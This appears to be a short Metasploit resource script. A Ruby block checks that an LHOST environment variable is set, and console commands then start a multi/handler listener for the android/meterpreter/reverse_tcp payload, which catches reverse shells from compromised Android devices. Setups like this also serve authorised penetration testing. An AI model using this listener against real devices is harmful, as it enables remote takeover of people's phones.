<ruby>
# Set LHOST from the environment variable
lhost = ENV['LHOST']

# Check if LHOST is set
if lhost.nil? || lhost.empty?
    print_error("LHOST environment variable is not set.")
    exit
end
</ruby>

workspace demo
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
show options